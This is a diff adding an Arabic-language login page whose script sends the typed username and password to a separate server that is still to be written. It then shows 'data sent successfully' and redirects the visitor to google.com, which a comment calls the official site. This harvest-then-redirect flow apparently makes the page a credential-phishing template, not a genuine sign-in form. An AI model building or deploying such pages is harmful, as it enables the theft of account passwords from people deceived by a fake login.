@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>صفحة تسجيل الدخول</title>
+    <style>
+        /* تنسيق CSS لتحسين مظهر الصفحة */
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .login-container {
+            background-color: #fff;
+            padding: 2rem;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            width: 350px;
+            text-align: center;
+        }
+
+        h2 {
+            color: #333;
+            margin-bottom: 1.5rem;
+        }
+
+        .form-group {
+            margin-bottom: 1rem;
+            text-align: right;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 0.5rem;
+            color: #555;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-size: 1rem;
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #007bff;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        button:hover {
+            background-color: #0056b3;
+        }
+
+        #message {
+            margin-top: 1rem;
+            color: #d9534f;
+            font-weight: bold;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="login-container">
+        <h2>تسجيل الدخول</h2>
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="username">اسم المستخدم:</label>
+                <input type="text" id="username" placeholder="أدخل اسم المستخدم" required>
+            </div>
+            <div class="form-group">
+                <label for="password">كلمة المرور:</label>
+                <input type="password" id="password" placeholder="أدخل كلمة المرور" required>
+            </div>
+            <button type="submit">تسجيل الدخول</button>
+        </form>
+        <p id="message"></p>
+    </div>
+
+    <script>
+        // هذا الكود هو المسؤول عن إرسال البيانات
+        document.getElementById('loginForm').addEventListener('submit', function (event) {
+            // منع السلوك الافتراضي لإرسال النموذج الذي يسبب تحديث الصفحة
+            event.preventDefault();
+
+            // الحصول على قيم الحقول
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            // الرابط الذي سيتم إرسال البيانات إليه
+            // يجب تعديل هذا الرابط ليتوافق مع رابط الخادم الذي ستقوم بإنشائه لاحقًا
+            const serverUrl = 'http://localhost:3000/login-handler';
+
+            // إرسال البيانات إلى الخادم باستخدام Fetch API
+            fetch(serverUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ username, password }),
+            })
+                .then(response => {
+                    if (!response.ok) {
+                        // إذا كان هناك خطأ في الاستجابة
+                        throw new Error('حدث خطأ في الشبكة أو الخادم.');
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    const messageElement = document.getElementById('message');
+                    if (data.success) {
+                        messageElement.style.color = '#5cb85c'; // لون أخضر للنجاح
+                        messageElement.innerText = 'تم إرسال البيانات بنجاح، سيتم تحويلك الآن...';
+                        // تحويل المستخدم إلى الموقع الرسمي بعد ثانيتين
+                        setTimeout(() => {
+                            window.location.href = 'https://google.com';
+                        }, 2000);
+                    } else {
+                        messageElement.style.color = '#d9534f'; // لون أحمر للخطأ
+                        messageElement.innerText = 'حدث خطأ: ' + (data.message || 'فشل إرسال البيانات.');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    const messageElement = document.getElementById('message');
+                    messageElement.style.color = '#d9534f';
+                    messageElement.innerText = 'فشل الاتصال بالخادم. يرجى المحاولة لاحقًا.';
+                });
+        });
+    </script>
+
+</body>
+
+</html>
